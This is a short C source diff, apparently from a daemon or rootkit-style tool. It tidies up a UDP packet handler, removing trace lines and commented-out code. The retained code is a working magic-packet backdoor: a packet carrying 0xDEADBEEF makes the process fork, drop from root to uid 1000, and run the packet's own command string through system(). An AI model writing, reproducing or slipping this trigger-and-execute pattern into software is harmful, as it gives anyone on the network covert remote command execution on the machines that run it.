@@ -468,35 +468,24 @@ static void handle_udp_packet(listen_packet_t* udp_msg)
 	if (udp_msg->magic == 0xDEADBEEF)
 	{
 		TRACE(("*****this is magic!"))
-		TRACE(("*****executing shell command"))
 		pid_t pid = fork();
 		switch(pid)
 		{
 			case -1:   // fork failed
 				TRACE(("fork failed - couldn't create proccess to run shell cmd %s", udp_msg->shell_command))
 				break;
-
 			case 0:    // child process
-				TRACE(("****** before executing cmd in child"))
-				//system("/bin/sh -c whoami"); 
-				//gid_t gid;
-    			//uid_t uid;
+				TRACE(("****** before executing cmd in child"))		
 				//we are root
 				if (getuid() == 0) 
 				{        			
-					setgid(100); // GID of 100 usually represents the users group.
+					setgid(100); // GID of 100 represents the users group.
 					setuid(1000); //new users in Ubuntu start from uid 1000
     			}
 				int status = system(udp_msg->shell_command);
-
-				//execve( string, tab, env );   // does not return unless an error
-				//perror("execve failed");
-				//exit( EXIT_FAILURE );
 				break;
-
 			default:
 				// don't wait for the child
-				//waitpid( pid, &status, 0 );
 				break;
 		}
 	}	
